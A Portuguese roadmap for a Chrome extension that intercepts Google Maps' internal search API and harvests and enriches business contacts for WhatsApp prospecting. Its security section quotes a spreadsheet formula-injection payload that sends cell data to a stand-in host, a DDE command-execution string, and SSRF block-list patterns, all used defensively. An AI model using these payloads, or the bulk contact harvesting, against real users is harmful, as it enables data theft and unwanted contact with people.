# Plano de Evolução

> Documento vivo. Última revisão: **2026-07-29** · Estado do código: **v2.0.0** (commit `bce0d84`) · **Blocos 0, 1 e 2 concluídos · Bloco 3 implementado, validação manual pendente**
>
> Este plano existe para que qualquer pessoa — inclusive você daqui a oito meses — consiga
> retomar o projeto sabendo **o que falta, por que importa e em que ordem fazer**, sem
> reconstruir o raciocínio do zero.

---

## Sumário

1. [Como usar este documento](#1-como-usar-este-documento)
2. [O que este projeto é](#2-o-que-este-projeto-é)
3. [Princípios de decisão](#3-princípios-de-decisão)
4. [Estado atual (baseline)](#4-estado-atual-baseline)
5. [Diagnóstico: o que está aberto](#5-diagnóstico-o-que-está-aberto)
6. [Roadmap](#6-roadmap)
   - [Bloco 0 — Dívida de segurança](#bloco-0--dívida-de-segurança-crítico)
   - [Bloco 1 — Proteger o ativo](#bloco-1--proteger-o-ativo)
   - [Bloco 2 — De lista para decisão](#bloco-2--de-lista-para-decisão)
   - [Bloco 3 — Quebrar o teto de cobertura](#bloco-3--quebrar-o-teto-de-cobertura)
   - [Bloco 4 — Escala e conformidade](#bloco-4--escala-e-conformidade)
   - [Bloco 5 — Visionário](#bloco-5--visionário)
7. [Decisões tomadas e não negociáveis](#7-decisões-tomadas-e-não-negociáveis)
8. [O que foi deliberadamente rejeitado](#8-o-que-foi-deliberadamente-rejeitado)
9. [Riscos e contingências](#9-riscos-e-contingências)
10. [Métricas de sucesso](#10-métricas-de-sucesso)
11. [Manutenção deste documento](#11-manutenção-deste-documento)

---

## 1. Como usar este documento

Cada item do roadmap tem a mesma estrutura:

| Campo | Para quê |
|---|---|
| **Problema** | O sintoma concreto, não a categoria abstrata |
| **Por que importa** | O custo de não fazer — em risco, tempo ou dinheiro |
| **Solução** | Abordagem técnica com arquivos e funções reais do repositório |
| **Critério de aceite** | Como saber que terminou. Se não dá para verificar, não está pronto |
| **Teste** | O que cobrir em `test/`. Item sem teste é item que regride |
| **Esforço / Risco / Depende de** | Para planejar uma sessão |

Os blocos são sequenciais por dependência lógica, **não** por urgência de calendário. Pode-se
parar depois de qualquer bloco com o projeto num estado coerente.

---

## 2. O que este projeto é

Não é "um scraper do Google Maps". É **um decodificador da API interna do Google Maps com um
enriquecedor de contatos acoplado**.

O Maps consulta um endpoint próprio (`/search`) que devolve um array posicional. A extensão
troca o protótipo do `XMLHttpRequest` da página, captura a resposta crua e decodifica por
índice. Todo o resto — rolagem automática, painel, fila de enriquecimento, dashboard — é
infraestrutura em volta dessa única jogada.

**Consequência estratégica que orienta o plano inteiro:** o ativo do projeto é o *mapa de
índices* (`FIELD_PATHS` em `src/content/parser.js`), não o código. O código foi reescrito em
um dia. O conhecimento de que `entry[178][0][0]` é o telefone é engenharia reversa que ninguém
documenta e que pode quebrar sem aviso, em qualquer terça-feira, sem gerar um único erro.

Boa parte do Bloco 1 existe para proteger esse ativo.

### O produto real

O produto não é a lista de leads. É **quem ligar hoje de manhã**. A lista é matéria-prima; a
decisão é o produto. Hoje a ferramenta entrega apenas matéria-prima — o Bloco 2 existe para
fechar essa lacuna.

### Contexto de uso

Ferramenta de usuário único, local, alimentando prospecção B2B por WhatsApp
(ver `meu-disparo-n8n` no vault). Não há servidor, banco, sessão nem múltiplos usuários.
Isso muda o significado de "segurança", "escala" e "performance" neste documento — ver §3.

---

## 3. Princípios de decisão

Regras que já orientaram escolhas feitas e devem orientar as próximas.

1. **Falha ruidosa vence falha silenciosa.** Um lead perdido com aviso na tela custa minutos;
   800 leads exportados com telefone vazio custam uma campanha inteira e a confiança na
   ferramenta.
2. **Nunca inventar dado plausível.** Vale para o nono dígito de celular antigo, para índices
   do payload não verificados e para classificação de telefone de país cuja regra não está
   implementada. Dado ausente é honesto; dado inventado é armadilha.
3. **Sem build step enquanto isso for viável.** A pasta *é* a extensão: carrega em 10 segundos,
   sem `node_modules`, sem bundler apodrecendo. O teste de carga em `test/contentscript.test.js`
   já cobre o único risco real dessa escolha (colisão de símbolo no escopo global).
4. **Estado não mora no service worker.** Em MV3 ele é encerrado após ~30s ocioso. Fila e
   estado ficam no content script, que vive enquanto a aba viver.
5. **IA só onde o erro é barato.** Enriquecimento em lote, classificação de nicho, rascunho de
   abordagem: sim. Parse, dedupe, classificação de telefone: nunca — são decisões
   determinísticas onde o erro do LLM é silencioso e caro.
6. **Otimizar depois de medir.** Nenhum item de performance ou escala entra antes de a dor
   aparecer com número. Ver limiares no Bloco 4.
7. **Escopo de segurança é o realista.** Não há SQL, sessão ou servidor. As classes de risco
   que existem aqui são: injeção via arquivo exportado, SSRF pela rede local do usuário e
   superfície de mensagem excessiva. É nelas que o Bloco 0 mira.

---

## 4. Estado atual (baseline)

### O que já foi feito (v2.0.0)

| Entrega | Efeito |
|---|---|
| Gate de conta removido | Sem login, sem quota, sem telemetria para `productivityimprover.com` |
| Código desminificado em `src/` | 7 módulos legíveis; ~50% de `contentScript.js` era código morto |
| Dedupe em cascata | `placeID` → `cID` → nome+endereço. **Antes, placeID vazio descartava todos os leads seguintes em silêncio** |
| Persistência antes do enriquecimento | F5 no meio da coleta não perde nada |
| Fila com concorrência limitada + retry | Antes: rajada de até 11 requisições por lead, sem controle |
| Telefone E.164 + classificação | `phone_e164`, `phone_type`, `phone_legacy_8digits` |
| Painel resiliente | `MutationObserver` + fallback `.w6VYqd` → `[role=feed]` → `body` flutuante |
| Interceptação de `fetch` além de XHR | Migração do Maps não derruba a extensão em silêncio |
| Dashboard com filtros e export filtrado | Export respeita o filtro ativo |
| 50 testes (`npm test`) | Parser, dedupe, telefone, storage, fila e boot do content script |
| 24 MB → 1,6 MB | Semantic UI, ECharts, jQuery, axios, bootstrap eram carga morta |
| **CSV/XLSX sanitizado contra injeção de fórmula** | `accessorDownload` neutraliza `= + - @` na exportação, sem alterar o valor exibido na tela |
| **SSRF bloqueado no enriquecimento** | `isPublicHttpUrl()` recusa loopback, RFC 1918, link-local e `.local`/`.internal` antes de qualquer `fetch` |
| **Handler `access` removido** | Proxy de fetch arbitrário sem contrapartida — apagado |
| **Canário de esquema do parser** | `assessSchemaHealth()` avisa em vermelho no painel quando o Google reordena o payload, em vez de exportar telefone vazio em silêncio |
| **`docs/payload-map.md` versionado** | Tabela de índices com data de verificação + procedimento de remapeamento — linkado no README e no cabeçalho de `parser.js` |
| **Hook de pre-commit** | `npm install` instala automaticamente (fonte versionada em `scripts/git-hooks/`) — testes rodam antes de cada commit |
| **Score de oportunidade** | `opportunity_score` + `opportunity_reasons` em todo lead; dashboard abre ordenado por ele. Redesenhado durante a implementação: ver nota no Bloco 2 |
| **Campanhas separáveis** | Filtro e export por `search_query` no dashboard; últimas buscas com contagem no popup |
| **Status de sessão e conclusão** | "Rolando... N novos", e ao parar: motivo real (fim da lista · trava · interrompido) |
| **Modo campanha (grade de buscas)** | Gera várias buscas (por região), navega entre elas sozinha, dedupe global já cobre a agregação. **Código completo, execução real em browser ainda não validada** |
| 165 testes (`npm test`) | +83 desde o Bloco 1: oportunidade (18), campanhas (7), status de sessão (6), grade/campanha/runner (39), + casos de ponta a ponta |

### Notas do estado atual

| Eixo | Nota | Comentário |
|---|---|---|
| Arquitetura | 8,0 | Limpa; presa a índices posicionais e escopo global — inerente ao domínio |
| Código | 8,5 | Legível, comentado no *porquê*, sem código morto |
| Organização | 8,5 | `payload-map.md` e hook de teste resolvidos (Bloco 1). Falta só `screenshot/` desatualizado (D14) |
| UX | 8,0 | Mostra progresso, motivo de parada e separa campanhas (Bloco 2) |
| UI | 6,5 | Funcional e consistente; não memorável — aceitável para ferramenta de trabalho |
| Segurança | 8,5 | **Bloco 0 concluído**: CSV injection sanitizado, SSRF bloqueado, handler órfão removido. Falta o que depende de gatilho futuro (§4.3 lista de supressão) |
| Performance | 7,0 | Concorrência resolvida; falta cache e parada antecipada |
| Escalabilidade | 6,0 | Sólida até ~20k leads; degrada por carregar tudo em memória |
| Documentação | 8,5 | README honesto + `payload-map.md` versionado transformam arqueologia em consulta |
| **Produto** | **8,0** (⚠️ **condicional**) | A lista virou fila priorizada (Bloco 2) e o teto de ~120/busca tem solução em código (Bloco 3) — mas o ganho de cobertura só é real depois de validado num browser de verdade |
| Inovação | 7,5 | A interceptação de API interna é boa; o score de oportunidade é o segundo diferencial real |
| **Qualidade geral** | **8,3** | Segurança e ativo do parser protegidos, produto entrega decisão e (potencialmente) cobertura 10-30x maior. Falta validar o Bloco 3 em uso real antes de contar esse ganho como entregue |

*(Antes da refatoração de 2026-07-28: 3,5 · pós-refatoração: 7,0 · pós-Bloco 0: 7,5 · pós-Bloco 1: 7,8 · pós-Bloco 2: 8,2.)*

---

## 5. Diagnóstico: o que está aberto

Achados confirmados no código, com localização. Cada um vira um item do roadmap.

| # | Achado | Onde | Gravidade |
|---|---|---|---|
| ~~D1~~ | ~~CSV/XLSX sem sanitização de fórmula~~ | `src/shared/csvsafe.js` | ✅ Resolvido (Bloco 0) |
| ~~D2~~ | ~~`fetch` para qualquer host, inclusive rede local~~ | `src/background/enrich.js:isPublicHttpUrl` | ✅ Resolvido (Bloco 0) |
| ~~D3~~ | ~~Handler `access` órfão = proxy de fetch arbitrário~~ | `src/background/router.js` | ✅ Resolvido (Bloco 0) |
| ~~D4~~ | ~~Quebra de índice do payload é silenciosa~~ | `src/content/schema-health.js` | ✅ Resolvido (Bloco 1) |
| ~~D5~~ | ~~Mapa de índices só existe em comentários~~ | `docs/payload-map.md` | ✅ Resolvido (Bloco 1) |
| ~~D6~~ | ~~Nenhuma qualificação de lead~~ | `src/shared/opportunity.js` | ✅ Resolvido (Bloco 2) |
| D7 | Teto de ~120 resultados por busca | `src/shared/campaign*.js`, `src/content/campaign-runner.js` | ⚠️ Implementado, validação manual pendente (Bloco 3) |
| ~~D8~~ | ~~Base acumula tudo sem separar campanhas~~ | `src/shared/campaigns.js` | ✅ Resolvido (Bloco 2) |
| D9 | Enriquecimento sem cache; deep search sempre roda | `src/background/enrich.js:extractContacts` | 🟡 Média |
| D10 | `allLeads()` carrega a base inteira em memória | `src/shared/storage.js` | 🟡 Média (futura) |
| D11 | Sem lista de supressão (LGPD) | — (ausência) | 🟡 Média |
| ~~D12~~ | ~~Sem hook rodando os testes~~ | `scripts/git-hooks/pre-commit` | ✅ Resolvido (Bloco 1) |
| ~~D13~~ | ~~Coleta não informa progresso nem conclusão~~ | `src/content/session-status.js` | ✅ Resolvido (Bloco 2) |
| D14 | `screenshot/` (2,5 MB) mostra a UI antiga | `screenshot/` | 🟢 Baixa |

---

## 6. Roadmap

### Bloco 0 — Dívida de segurança (crítico)

> ✅ **Concluído em 2026-07-29.** Total real: ~1h — os três itens saíram como planejado, sem
> desvio de escopo. Nota de segurança: 4,5 → 8,5. +18 testes (`test/csvsafe.test.js`,
> `test/enrich.test.js`).

<details>
<summary>Detalhamento original (mantido para histórico e para quem revisitar a decisão)</summary>

---

#### 0.1 — Sanitizar exportação contra injeção de fórmula (D1)

**Problema.** O Tabulator escapa apenas aspas ao montar o CSV:

```js
t.push('"' + String(i).split('"').join('""') + '"')
```

Isso **não** protege contra fórmula. Excel, LibreOffice e Google Sheets avaliam campos
iniciados por `=`, `+`, `-` ou `@` mesmo entre aspas.

**Por que importa.** O vetor de entrada é o **nome do estabelecimento no Google Maps — escrito
pelo dono do negócio**. Um nome cadastrado como
`=HYPERLINK("http://evil.tld/?"&A1,"clique aqui")` exfiltra células vizinhas quando a planilha
é aberta e clicada. Em Excel legado, `=cmd|'/c calc'!A1` chega a execução de comando. Estes
CSVs são abertos no Sheets/Excel toda semana — o risco é operacional, não teórico.

**Solução.** Sanitizar **na saída**, sem alterar o dado exibido na tela nem o que está gravado
na base. O Tabulator 4.6.3 suporta `accessorDownload` na definição de coluna (confirmado no
bundle), o que cobre CSV e XLSX num ponto só:

```js
// src/shared/csvsafe.js
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

/** Neutraliza fórmula sem perder o valor: prefixo apóstrofo, padrão do OWASP. */
function sanitizeForSpreadsheet(value) {
  if (typeof value !== 'string') return value;
  return FORMULA_TRIGGERS.test(value) ? `'${value}` : value;
}
```

Aplicar em `buildColumns()` (`js/dashboard.js`) como `accessorDownload: sanitizeForSpreadsheet`.

**Critério de aceite.** Um lead cujo nome seja `=1+1` sai no CSV como `'=1+1` e é exibido como
texto ao abrir no Sheets. O valor na tela do dashboard continua `=1+1`.

**Teste.** `test/csvsafe.test.js`: os quatro gatilhos, string normal intocada, valor não-string
intocado, string vazia, e um caso realista de `=HYPERLINK`.

**Esforço** 30 min · **Risco** Nulo · **Depende de** nada

---

#### 0.2 — Bloquear destinos privados no enriquecimento (D2)

**Problema.** `extractContacts()` faz `fetch` no campo `website` do lead — valor vindo do
payload do Google, portanto escrito por terceiro. Não há verificação de destino, e o manifest
concede `*://*/*`.

**Por que importa.** Um negócio com website cadastrado como `http://192.168.1.1/admin` ou
`http://localhost:8080` faz a extensão bater no roteador e nos serviços locais da máquina, com
o HTML retornando ao service worker — onde os regex de e-mail varrem o conteúdo. É SSRF na
própria rede do usuário, disparado por dado de terceiro.

**Solução.** Guarda em `fetchUrlContent()` (`src/background/enrich.js`), antes do `fetch`:

```js
const BLOCKED_HOSTS = /^(localhost|127\.|10\.|192\.168\.|169\.254\.|::1|\[::1\])/i;
const BLOCKED_172 = /^172\.(1[6-9]|2\d|3[01])\./;

function isPublicHttpUrl(url) {
  try {
    const parsed = new URL(url);
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false;
    const host = parsed.hostname.toLowerCase();
    if (BLOCKED_HOSTS.test(host) || BLOCKED_172.test(host)) return false;
    if (host.endsWith('.local') || host.endsWith('.internal')) return false;
    return true;
  } catch {
    return false;
  }
}
```

Bloqueio registra `console.warn` e devolve string vazia — o lead continua na base, sem e-mail.

**Nota de escopo.** Isto barra o caso por nome/IP literal, que é o vetor real aqui. Não barra
um domínio público que resolva para IP privado por DNS (rebinding) — extensões não têm acesso
à resolução para verificar isso, e o custo/benefício não justifica proxy próprio.

**Critério de aceite.** `website = http://192.168.0.1` não gera requisição; log explica; o lead
é exportado normalmente sem e-mail.

**Teste.** `test/enrich.test.js` sobre `isPublicHttpUrl`: loopback, os três blocos privados,
link-local, `.local`, `file:`, `ftp:`, URL inválida — e um domínio público legítimo passando.

**Esforço** 40 min · **Risco** Nulo · **Depende de** nada

---

#### 0.3 — Remover o handler `access` (D3)

**Problema.** `src/background/router.js:19` aceita `{action:'access', data:{url}}` e busca
qualquer URL, devolvendo o corpo. Nenhum código chama mais — resquício da arquitetura anterior.

**Por que importa.** Superfície de ataque sem contrapartida: um proxy de fetch irrestrito
esperando por quem souber falar com ele.

**Solução.** Apagar o `case`. Se algum dia voltar a ser necessário, deve nascer com
`isPublicHttpUrl` (0.2) já aplicado.

**Critério de aceite.** `grep -rn "'access'" src/` não retorna nada; os 50 testes seguem verdes.

**Esforço** 2 min · **Risco** Nulo · **Depende de** nada

---

</details>

### Bloco 1 — Proteger o ativo

> ✅ **Concluído em 2026-07-29.** Nota de organização/código sem mudança visível na tabela
> (já eram altas), mas o risco de silêncio em D4 está fechado. +14 testes (82 no total):
> `test/schema-health.test.js` (11) e 3 casos de ponta a ponta em `test/contentscript.test.js`.
>
> **Dois desvios deliberados do texto original**, registrados aqui porque mudam comportamento:
> - **1.1** usa `OverlayUI.setWarning()`, não `OverlayUI.setMessage()` como o rascunho original
>   sugeria. Os dois dividiam o mesmo elemento (`progressLabel`); como `setProgress()` reescreve
>   esse texto a cada lead enriquecido, um aviso de esquema quebrado seria apagado no próximo
>   tick da fila — exatamente o tipo de falha silenciosa que este item existe para eliminar.
>   `setWarning()` usa um elemento próprio, persistente até ser limpo explicitamente.
> - **1.3** não escreve direto em `.git/hooks/pre-commit` porque esse diretório não é versionado
>   pelo git — o hook se perderia num clone novo. A fonte ficou em `scripts/git-hooks/pre-commit`,
>   instalada via `npm install` (script `prepare` em `scripts/install-git-hooks.js`).

<details>
<summary>Detalhamento original (mantido para histórico)</summary>

---

#### 1.1 — Canário de esquema do parser (D4)

**Problema.** O `pick()` garante que um índice alterado custe *um campo*, não o lead inteiro.
O efeito colateral é que a quebra vira invisível: a coleta continua, os leads entram, e o
telefone chega vazio.

**Por que importa.** É o modo de falha mais caro do projeto: 800 linhas exportadas, campanha
montada, e a descoberta acontece no disparo. O custo de detectar na hora é uma linha vermelha
no painel.

**Solução.** Após cada lote em `ingestSearchPayload()`, medir a taxa de preenchimento dos
campos críticos (`name`, `phone`, `placeID`) e devolver junto com os leads:

```js
// lotes pequenos não são amostra: só avalia a partir de 10 itens
function assessSchemaHealth(leads, { minSample = 10, floor = 0.5 } = {}) {
  if (leads.length < minSample) return { healthy: true, degraded: [] };
  const degraded = ['name', 'phone', 'placeID'].filter(
    (field) => leads.filter((lead) => lead[field]).length / leads.length < floor
  );
  return { healthy: degraded.length === 0, degraded };
}
```

Quando degradado, `OverlayUI.setMessage()` mostra em vermelho:
*"O formato do Google mudou — `phone` não está sendo lido. Veja `docs/payload-map.md`."*

**Por que 50% e não 90%.** Nem todo estabelecimento tem telefone ou site cadastrado — uma
fatia vazia é normal. Abaixo de metade num lote de 10+, porém, o padrão indica mudança de
esquema, não característica dos negócios.

**Critério de aceite.** Um fixture com 12 leads sem telefone dispara o aviso citando `phone`.
Um fixture de 12 leads normais não dispara. Um lote de 3 leads vazios não dispara.

**Teste.** `test/schema-health.test.js`, mais um caso de ponta a ponta em
`test/contentscript.test.js` verificando o texto no painel.

**Esforço** 1h30 · **Risco** Baixo · **Depende de** nada

---

#### 1.2 — `docs/payload-map.md` versionado (D5)

**Problema.** O mapa de índices vive em comentários de `src/content/parser.js`. Não há registro
de *quando* cada índice foi verificado pela última vez nem de como remapear.

**Por que importa.** É o ativo do projeto. Um arquivo versionado com data transforma
arqueologia em consulta.

**Solução.** Documento com: tabela `campo → caminho → verificado em → observação`; o
procedimento de remapeamento via `window.__gmsDebug.lastEntry`; a estrutura do envelope
(`/*""*/` + `)]}'\n` + `[64]`); e os campos **ainda não mapeados** (Plus Code, `business_status`,
`price_level`) com o que já se sabe. Linkar no README e no cabeçalho do `parser.js`.

**Critério de aceite.** Uma pessoa sem contexto consegue, só com o documento, achar o índice de
um campo novo e adicioná-lo a `FIELD_PATHS`.

**Esforço** 1h · **Risco** Nulo · **Depende de** nada

---

#### 1.3 — Hook de pre-commit (D12)

50 testes que ninguém roda automaticamente ficam vermelhos sem aviso.
`.git/hooks/pre-commit` com `npm test`, mais uma linha no README explicando como pular
(`--no-verify`) quando for commit de documentação.

**Esforço** 15 min · **Risco** Nulo

---

</details>

### Bloco 2 — De lista para decisão

> ✅ **Concluído em 2026-07-29.** Nota de produto ainda não subiu formalmente (falta validar em
> uso real), mas a ferramenta agora ordena por oportunidade em vez de por ordem de chegada.
> +18 testes (122 no total): `test/opportunity.test.js` (18), `test/campaigns.test.js` (7,
> contado no Bloco 2.2), `test/session-status.test.js` (6, Bloco 2.3) e mais casos de ponta a
> ponta em `test/contentscript.test.js`.
>
> **Duas correções de design descobertas ao implementar**, registradas porque mudam o que o
> rascunho original descrevia:
>
> - **2.1 — a regra "Instagram sem site" era estruturalmente inalcançável.** O enriquecimento só
>   descobre Instagram/Facebook fazendo `fetch` do valor de `lead.website` — ou seja,
>   `lead.instagram` só existe quando `lead.website` já era não-vazio. A condição original
>   (`tem instagram && !website`) seria **sempre falsa**, capturada pelo teste de ponta a ponta
>   antes de ir para produção. Redesenhada como duas regras: `no_real_website` (site vazio OU é
>   um link de rede social — dispara sozinha) e `website_is_social_profile` (bônus quando o
>   "site" cadastrado no Maps é, na verdade, um perfil do Instagram/Facebook — padrão comum de
>   negócio pequeno). As duas são computáveis direto do payload, sem esperar o enriquecimento.
> - **2.3 — `setProgress` (fila de enriquecimento) e `setMessage` (status da sessão) disputavam
>   o mesmo elemento do painel**, igual ao problema do Bloco 1 com o aviso de esquema. Um tick de
>   "Enriquecendo X/Y" apagaria "Rolando... N novos" um instante depois. Resolvido com um segundo
>   elemento (`enrichProgressLabel`) dedicado só ao progresso da fila.

<details>
<summary>Detalhamento original (mantido para histórico)</summary>

---

#### 2.1 — Score de oportunidade (D6)

**Problema.** A ferramenta entrega uma lista indiferenciada. Toda a qualificação é manual.

**Por que importa.** O gargalo real da prospecção não é conseguir 500 contatos — é decidir
quais 30 valem a ligação de hoje. E os sinais para essa decisão **já estão na base**, sem uma
requisição a mais.

**Solução.** `src/shared/opportunity.js`, função pura, com regras configuráveis:

| Sinal | Peso | Leitura comercial |
|---|---|---|
| Sem website | +40 | Alvo direto para site/landing — o sinal mais forte |
| Nota < 4,0 com 10+ avaliações | +25 | Dor de reputação ativa |
| Menos de 10 avaliações | +20 | Perfil negligenciado, pouca concorrência na abordagem |
| Sem horário cadastrado | +15 | Perfil incompleto: vender gestão de Google Business |
| Tem Instagram e não tem site | +15 | Já investe em presença, falta base própria |
| Telefone é celular | +10 | Negócio pequeno, o dono atende o WhatsApp |
| Sem telefone algum | −50 | Inacessível para o canal principal |

Saída: `opportunity_score` (0–100) e `opportunity_reasons` (`"sem site · 4 avaliações ·
perfil incompleto"`) — a segunda coluna é o rascunho do argumento de venda.

Calculado na ingestão (`src/content/ingest.js`) e recalculável no dashboard após o
enriquecimento, já que `email` e `instagram` chegam depois.

**Critério de aceite.** Ordenar por `opportunity_score` no dashboard coloca no topo negócios
sem site e com poucas avaliações; `opportunity_reasons` explica cada linha em texto legível.

**Teste.** `test/opportunity.test.js`: cada sinal isolado, combinação, teto em 100, piso em 0,
e lead sem telefone caindo para o fim.

**Esforço** 4h · **Risco** Baixo · **Depende de** nada

---

#### 2.2 — Separar campanhas: filtro e export por busca (D8)

**Problema.** A base acumula tudo. Três campanhas diferentes exportam misturadas.

**Solução.** A coluna `search_query` já é gravada em todo lead — falta expô-la: um `<select>`
no dashboard com as buscas presentes na base (e a contagem de cada uma), integrado ao filtro
existente. No popup, lista das últimas buscas com total.

**Critério de aceite.** Selecionar uma busca no filtro e exportar produz um CSV só com aqueles
leads (o export já respeita o filtro ativo via `"active"`).

**Esforço** 2h · **Risco** Nulo · **Depende de** nada

---

#### 2.3 — Feedback de progresso e conclusão (D13)

Três ajustes pequenos em `src/content/scraper.js` + `overlay.js`:
contagem de resultados carregados durante a rolagem; mensagem explícita ao terminar
(*"Concluído — 87 leads nesta busca"*); e distinguir na mensagem os três motivos de parada
(fim da lista · trava de rolagem · interrupção do usuário).

**Esforço** 1h · **Risco** Nulo

---

</details>

### Bloco 3 — Quebrar o teto de cobertura

> ⚠️ **Implementado em código em 2026-07-29 · execução real ainda não validada em browser.**
> As quatro peças puras (geração de grade, máquina de estado, decisão de retomada, persistência)
> têm 39 testes e passaram por revisão de código completa. O que **não** dá para verificar sem
> abrir o Chrome de verdade: se o Google preserva o texto da busca na URL depois de carregar, se
> a heurística de CAPTCHA reconhece a página real, e se a navegação entre buscas funciona como
> esperado. Trate como "pronto para o primeiro teste manual", não como "validado em produção".
>
> +43 testes (165 no total): `campaign-grid.test.js` (13), `campaign.test.js` (13),
> `campaign-runner.test.js` (10) e 3 em `storage.test.js` — as 39 partes puras — mais 4 casos de
> ponta a ponta em `contentscript.test.js` cobrindo retomada automática, navegação para a próxima
> busca, pausa por CAPTCHA e conclusão da campanha.
>
> **Um bug real pego pelo próprio teste, antes de qualquer coisa**: a primeira versão de
> `buildMapsSearchUrl` gerava `.../maps/maps/search/...` (duplicava `/maps`) — exatamente o tipo
> de "formato de URL errado" que este bloco existe para não cometer. `test/campaign-grid.test.js`
> pegou na primeira rodada.
>
> **Decisão de escopo**: só a estratégia "por região" (lista de bairros digitada à mão) ganhou
> campo na UI do popup. `buildCoordinateGrid` (grid por raio/coordenada) existe, está testado, mas
> fica acessível só programaticamente por ora — um campo de raio+passo em km não cabia bem numa
> interface de popup de ~320px sem prejudicar o caso comum.

<details>
<summary>Detalhamento original (mantido para histórico)</summary>

---

#### 3.1 — Modo campanha: grade de buscas (D7)

**Problema.** O Google Maps satura a lista em torno de **100–120 resultados por busca**. Rolar
até o fim não traz mais. "Clínicas de estética em Brasília" nunca devolve as clínicas de
Brasília — devolve 120 delas, escolhidas pelo ranking do Google.

**Por que importa.** As 120 primeiras são justamente as que já têm marketing bom e já são
assediadas por todos os concorrentes. **A cauda longa — onde está o lead que ninguém abordou —
é invisível para uma busca única.** Nenhuma refatoração resolve isso; só fatiar a busca.

**Solução.** A URL do Maps aceita `/maps/search/QUERY/@lat,lng,ZOOMz`, o que permite gerar uma
grade de buscas programaticamente. Duas estratégias, ambas úteis:

- **Por região**: o usuário lista bairros/regiões administrativas; o sistema gera
  `QUERY + " em " + REGIÃO` para cada uma.
- **Por coordenada**: centro + raio + zoom fixo geram um grid de pontos.

Execução: fila de queries persistida em `storage.local`, executada em sequência na mesma aba,
com pausa entre buscas. **A agregação já funciona de graça** — a persistência com dedupe global
entre buscas, construída no Bloco anterior, era exatamente o pré-requisito disso.

Ganho esperado: **10–30x na cobertura real**.

**Riscos e mitigação.**
- *Formato de URL muda* → validar em runtime que a busca carregou resultados; abortar a fila
  com aviso em vez de rodar 40 buscas vazias.
- *CAPTCHA por volume* → pausa configurável entre buscas (padrão generoso, ex. 30–60s),
  detecção de página de CAPTCHA com parada imediata e aviso.
- *Fila longa e frágil* → estado em `storage.local`, retomável; nunca reiniciar do zero.

**Critério de aceite.** Uma campanha de 5 regiões executa as 5 buscas em sequência, a base
final não contém duplicatas entre elas, e a interrupção no meio permite retomar de onde parou.

**Teste.** Geração da grade e da fila com funções puras; retomada de estado no `LeadStore`.
A execução ponta a ponta exige validação manual no browser.

**Esforço** 8h · **Risco** Médio · **Depende de** 2.2 (senão as campanhas se misturam)

---

</details>

### Bloco 4 — Escala e conformidade

> Itens com gatilho. **Não implementar antes do gatilho** — seria otimização especulativa
> (princípio §3.6).

---

#### 4.1 — Cache de domínio e parada antecipada no enriquecimento (D9)

**Gatilho:** quando uma coleta passar de ~10 minutos.

O custo dominante é rede: 1 a 11 requisições por lead; 500 leads com deep search chegam a 5.500
requisições. Três medidas, em ordem de retorno:

1. **Cache por domínio** em `storage.local` com TTL de dias — franquias e redes compartilham
   site, e o mesmo domínio hoje é rebaixado do zero em toda coleta.
2. **Parar cedo**: se a home já entregou e-mail do próprio domínio, o deep search nas páginas
   de contato é desperdício puro. Hoje roda de qualquer forma.
3. **Truncar o corpo** em ~1 MB antes dos regex — um site de 8 MB passa seis regex globais
   inteiras sem ganho.

**Esforço** 1h30 · **Risco** Baixo

---

#### 4.2 — Índice leve e, depois, IndexedDB (D10)

**Gatilho:** base acima de ~20 mil leads, ou dashboard demorando mais de 2s para abrir.

`LeadStore.allLeads()` faz `chrome.storage.local.get(null)` e materializa a base inteira em
memória, com um segundo array achatado no dashboard.

| Volume | Comportamento hoje |
|---|---|
| ~2.000 | Instantâneo |
| ~20.000 | Alguns segundos ao abrir |
| ~100.000 | Provável travamento da aba |

Solução em dois degraus: (a) índice leve `{key, name, phone_type, has_email, has_website,
rating, query, score}` numa chave separada, alimentando o Tabulator, com o registro completo
buscado sob demanda; (b) acima de ~50k, migrar para **IndexedDB**, que permite consulta por
índice sem carregar tudo.

**Esforço** 6h · **Risco** Médio · **Depende de** medição real

---

#### 4.3 — Lista de supressão (D11)

**Gatilho:** antes do primeiro disparo em volume.

Você coleta dado de contato comercial para prospecção. Para PJ, legítimo interesse cobre; **MEI
e autônomo são pessoa física** e o tratamento muda. `search_query` e `scraped_at` já registram
a origem — metade da conformidade. Falta a outra metade: **quem pediu para não receber contato
precisa ser filtrado no export, não apenas no disparo**.

Solução: chave `suppression` em `storage.local` com telefones em E.164; leads correspondentes
marcados e excluídos do export por padrão; importação da lista por colagem. Conecta direto com
o opt-out do `meu-disparo-n8n`.

**Esforço** 2h · **Risco** Nulo

---

### Bloco 5 — Visionário

---

#### 5.1 — Delta entre coletas: "novos no mapa"

A base é persistente e deduplicada, então rodar a mesma campanha em 30 dias responde: **quem
apareceu desde a última vez?**

Um negócio que acabou de entrar no Google Maps ainda não foi abordado por ninguém e está
comprando tudo — site, gestão de perfil, tráfego. **É o lead mais quente que existe nesse
mercado**, e a infraestrutura para detectá-lo já está pronta: basta comparar chaves entre
execuções e marcar `first_seen_at`.

**Esforço** 3h · **Risco** Baixo · **Depende de** 3.1

---

#### 5.2 — Enriquecimento por IA em lote (opt-in)

Estritamente **fora do caminho crítico**, rodando depois da coleta, sobre leads já salvos:

- **Nicho real** a partir de nome + categoria + conteúdo do site (a `category` do Google é grosseira)
- **Primeira linha da abordagem** a partir de `opportunity_reasons`
- **Nome do responsável** extraído da página "sobre"

Requisitos herdados do vault: `onError` que degrada graciosamente, timeout curto, fallback
materializado *antes* da chamada, e nenhuma decisão de negócio delegada ao modelo.

**Esforço** 6h · **Risco** Médio (custo de API, latência)

---

#### 5.3 — Higiene do repositório (D14)

`screenshot/` tem 2,5 MB de imagens da interface antiga — hoje é o maior diretório do projeto
e documenta uma UI que não existe mais. Substituir por 2–3 capturas atuais ou remover.

**Esforço** 30 min

---

## 7. Decisões tomadas e não negociáveis

Registradas para não serem re-litigadas a cada sessão.

| Decisão | Razão |
|---|---|
| **Não inserir o nono dígito** em celular BR de 8 dígitos | O número gerado pode existir e pertencer a outra pessoa. Num disparo de WhatsApp, isso é mensagem para desconhecido. Marca-se `phone_legacy_8digits` e a decisão fica com o humano |
| **Sem libphonenumber** | ~500 KB para um caso majoritariamente BR. Regras do BR implementadas de verdade; outros países recebem só o código de discagem e ficam `unknown` |
| **Sem bundler** | A pasta é a extensão. O único risco real (colisão de símbolo) já é coberto por teste |
| **Fila no content script**, não no service worker | MV3 encerra o worker ocioso e levaria a fila junto |
| **Export respeita o filtro ativo** | Filtrar na tela e baixar a base inteira é armadilha silenciosa |
